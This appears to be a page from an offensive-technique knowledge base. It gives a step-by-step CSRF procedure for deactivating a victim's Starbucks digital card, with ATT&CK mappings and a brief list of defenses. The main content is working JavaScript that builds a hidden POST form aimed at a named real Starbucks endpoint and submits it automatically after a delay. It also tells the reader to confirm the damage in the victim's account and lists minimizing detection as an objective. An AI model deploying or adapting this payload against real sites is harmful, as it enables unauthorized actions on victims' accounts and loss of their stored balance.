---
tags:
  - csrf
  - web-vulnerability
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:30.036Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: b799f6b8-4563-43b7-9ec2-143a4b3d22d8
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
---
# Submit-CSRF-Confirmation-Form-Two

## Summary

This procedure handles the final confirmation by submitting the second form via JavaScript, completing the CSRF attack and deactivating the Starbucks digital card.

## Description

Following a 2000ms delay after the first submission, JavaScript submits form2 to the same zero-balance endpoint. This chained submission exploits the unprotected POST requests, resulting in the card being reported as lost/stolen and access revoked.

## Requirements

1. Successful first form submission
2. Relevant confirmation data (e.g., confirmation fields)
3. Continued session validity

## Defense

Defensive measures and detection strategies:

- Double-opt-in or additional auth for high-impact actions like deactivation
- Rate limiting on sensitive endpoints
- Browser-side detection of automated form submissions

## Objectives

1. Confirm and execute deactivation
2. Achieve full impact
3. Minimize detection

## Instructions

### Step 1: Implement Second Delayed Submission

**Context**: Chain the second setTimeout for form2.

Add to JavaScript:

```javascript
setTimeout(function() {
  var form2 = document.createElement('form');
  form2.method = 'POST';
  form2.target = '_bank';
  form2.action = 'https://www.starbucks.com/account/card/loststolenzerobalance';
  // Add confirmation fields
  document.body.appendChild(form2);
  form2.submit();
}, 2000);
```

> Submits after 2 seconds, completing the process.

### Step 2: Validate Deactivation

**Context**: Check victim's Starbucks account for changes.

Log into the account post-attack.

> Expected: Card status shows as lost/stolen, balance inaccessible.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[web-vulnerability]]
